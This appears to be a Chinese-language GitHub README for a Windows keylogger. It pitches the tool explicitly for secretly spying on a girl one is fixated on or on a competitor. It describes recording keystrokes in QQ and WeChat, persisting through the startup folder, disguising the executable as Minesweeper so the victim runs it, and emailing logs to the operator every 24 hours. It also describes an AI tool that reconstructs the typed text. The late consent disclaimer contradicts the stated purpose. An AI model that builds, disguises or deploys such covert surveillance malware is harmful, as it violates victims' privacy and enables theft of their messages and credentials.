[English](README.en.md)

# 🎹 键盘行为监视器

## 📋 概况

还在对喜欢的女孩恋恋不忘吗？还在为竞争对手而焦虑吗？本程序能帮助你监控目标应用（如QQ或微信）的键盘活动，并将这些数据记录下来，隔一段时间后自动发送到你的邮箱。

### ⚙️ 功能简介

- **🔍 应用监视**：本程序会监视自定义应用的运行状态，当检测到指定应用正在运行时，开始记录键盘行为。
- **🔄 开机自启**：打包后的文件运行后能自动添加自己到启动文件夹实现开机自启功能。
- **⌨️ 键盘记录**：记录键盘按键的详细信息，包括按键内容、按键次数以及按键时间。
- **💾 数据存储**：使用压缩的方式将记录的数据存储为二进制文件，节省存储空间。
- **📧 邮件发送**：程序会定时检测并通过指定的邮箱发送记录的键盘数据。
- **📊 数据读取**：提供一个独立的程序 `Read.py` 用于解压和读取存储的二进制数据，并将数据以表格形式展示，可导出为CSV或Excel文件。
- **🛠️ 打包工具**：提供一个 [Package_tool](https://github.com/ystemsrx/Application-Monitoring/releases) 工具，可以将程序打包成单个可执行文件，并且支持自定义图标。

### 📁 文件说明

- **Application_Monitoring**: 主程序，用于监视QQ和微信的运行状态，并记录键盘行为，将数据保存为压缩的二进制文件，并定时通过邮件发送。
- **Read.py**: 数据读取工具，解压并读取由 `Application_Monitoring` 生成的二进制文件，提供数据可视化和导出功能。我们还使用AI为此工具增加了数据解读的功能（需要提供**自己的API**并填入代码开头的列表，目前仅支持[OpenAI](https://platform.openai.com/api-keys)、[质谱清言](https://open.bigmodel.cn/usercenter/apikeys)、[通义千问](https://dashscope.console.aliyun.com/apiKey)）
- **Package_tool.py**: 打包工具，用于将Python脚本打包成单个可执行文件，并支持自定义图标。

### 📝 使用说明

1. **监视与记录**：
   - 将 `Application_Monitoring` 打包（有[打包工具](https://github.com/ystemsrx/Application-Monitoring/releases)）成exe，然后放入目标电脑运行，该程序会在后台持续自动检测QQ和微信的运行状态，并开始记录键盘输入。
   - 数据会实时存储在 `key_data.bin` 文件中。
   - 每隔24h会通过邮件发送给你。
   - 不用担心没有理由让对方打开文件。此文件能会伪装为扫雷程序，打包后仅有11MB大小，运行后将会打开扫雷看，监视程序则在后台运行，且即使关闭扫雷也不会有任何影响！
   - 开机自启动时也无需担心扫雷弹出，本程序有自动检测功能可以检测是否是开机自启还是亲自打开。

2. **读取与导出**：
   - 运行 `Read.py` 程序，将 `key_data.bin` 文件拖入，即可查看记录的键盘输入数据。
     
     ⚠**重要：运行[Read.py](Read.py)需安装`PyQt5`、`Pandas`和`Requests`库，运行`pip install pyqt5 pandas requests`来安装**

   - 可以将数据筛选并导出为CSV或Excel文件，便于进一步分析。
   - 可以使用工具自带的AI功能对数据进行复原恢复（需自备API KEY，目前仅支持[OpenAI](https://platform.openai.com/api-keys)、[质谱清言](https://open.bigmodel.cn/usercenter/apikeys)、[通义千问](https://dashscope.console.aliyun.com/apiKey)）。

3. **打包工具**：

   - 你的电脑必须安装Python，可以[在这里](https://www.python.org/downloads/release/python-3125/)下载安装 。
   - 使用打包工具工具可以将主程序打包成独立的可执行文件，[点击这里](https://github.com/ystemsrx/Application-Monitoring/releases)。将Python脚本拖入界面即可打包，支持添加自定义图标（拖入图片或图标即可）。
   - 运行[打包工具](Package_tool.py)以及对主程序进行打包**需要安装`PyQt5`、`keyboard`、`psutil`、`pywin32`、`PyInstaller`、`Pillow`库，执行以下代码进行安装：`pip install keyboard psutil pywin32 pyqt5 pyinstaller pillow`**。

### 🖋️ 需要填写的内容

在 `Application_Monitoring` 文件中，有几处需要填写和修改的内容，以确保程序按预期工作：

1. **📧 邮箱配置**：
   - `from_addr`：发件人的邮箱地址。
   - `to_addr`：接收记录的邮箱地址。
   - `password`：发件人的邮箱SMTP授权码，授权码请自行搜索如何获得。

   例如：
   ```python
   from_addr = "your_email@example.com"
   to_addr = "recipient_email@example.com"
   password = "your_email_password_or_smtp_token"
   ```

2. **💽 文件存储路径**：
   - `compressed_file`：存储压缩数据的文件路径。请根据需要修改存储路径，确保程序有权限在该路径下读写文件。推荐写入除C盘外的其他盘。

   例如：
   ```python
   compressed_file = "D:\\your_path\\key_data.bin"
   ```

3. **⏰ 时间间隔设置**：
   - `interval_time` ：程序默认设置为每24小时（86400秒）发送一次记录邮件。可以根据需要修改该时间间隔，默认24h。

   例如，修改为每12小时发送：
   ```python
   interval_time = 43200:  # 12 hours in seconds
   ```

4. **📱 应用列表**
   - `applications = ["QQ", "WeChat"]`中添加应用，默认QQ和微信，应用用逗号隔开，需要打引号。**注意**：应用需要以程序进程的名字而不是自身的名字（可以在任务管理器里看），比如**企业微信**就叫**WXWork**。

5. **🤖 [Read.py](Read.py)中的API列表**
   - 若需要使用AI数据解读功能，请将自己的API KEY填写到列表中，若不愿意将它填写在列表，也能在程序启动时临时进行填写。目前我们支持的API KEY仅有[OpenAI](https://platform.openai.com/api-keys)、[质谱清言](https://open.bigmodel.cn/usercenter/apikeys)、[通义千问](https://dashscope.console.aliyun.com/apiKey)。同时，在函数`setup_model_selector`中，可以自行再添加更多支持的模型。

### ✅ TODO List

- [x] **统一应用监视**：通过在列表中输入应用名称即可监视该应用，而无需手动调整程序代码。

- [x] **数据解读工具**：当前程序只能记录按键内容，但无法解读完整的拼音输入。后续将开发一个工具，能够解读并重构出用户实际输入的文字内容，以便更直观地了解输入内容。

- [X] **开机自启动**：增加开机自启动功能。

### ⚠️ 免责声明

本程序涉及的功能可能会侵犯个人隐私或违反法律法规。请在使用前确保已获得相关人员的明确同意，并遵守所在地的法律规定。未经许可进行的监视和数据收集行为可能会带来法律责任。开发者不对任何非法使用或由此产生的后果负责。

---

**重要提示**：请谨慎使用本程序，遵守所有相关法律法规。
